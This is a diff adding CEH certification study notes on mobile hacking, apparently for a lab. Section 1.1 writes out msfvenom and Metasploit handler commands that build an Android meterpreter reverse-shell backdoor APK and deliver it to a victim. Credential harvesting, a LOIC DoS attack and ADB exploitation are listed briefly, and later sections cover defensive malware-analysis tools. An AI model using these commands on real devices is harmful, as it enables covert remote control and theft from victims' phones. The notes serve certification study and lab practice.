@@ -1,0 +1,43 @@
+CEH Practical Notes
+------------------------------------------------
+Modulo 17 - Hacking Mobile Platforms
+------------------------------------------------
+
+1 - Hack android devices
+ 
+	1.1 - Hack an Android device by creating binary payloads using Parrot Security
+		
+		># msfdb init
+		># service postgresql start
+		># msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.13 R > /Desktop/Backdoor.apk
+
+		# Send APK to Victim (Http, Mail, QR-Code, etc)
+
+		># msfconsole
+		># use exploit/multi/handler
+		># set payload android/meterpreter/reverse_tcp
+		># set LHOST=10.10.10.13
+		># show options
+		># exploit -j -z
+
+
+	1.2 - Harvest Users’ Credentials using the Social-Engineer Toolkit
+	1.3 - Launch a DoS attack on a target machine using Low Orbital Cannon (LOIC) on the Android mobile platform
+	1.4 - Exploit the Android platform through ADB using PhoneSploit
+
+		># https://github.com/aerosol-can/PhoneSploit
+
+
+2 - Secure Android Devices using Various Android Security Tools
+
+	2.1 - Analyze a malicious app using online Android analyzers
+
+		># https://www.sisik.eu/apk-tool 
+
+	2.2 - Analyze a malicious app using Quixxi vulnerability scanner
+
+		># https://vulnerability.quixxi.com/#/
+
+	2.3 - Secure Android devices from malicious apps using Malwarebytes Security
+
+		# Download and Install MalwareBytes
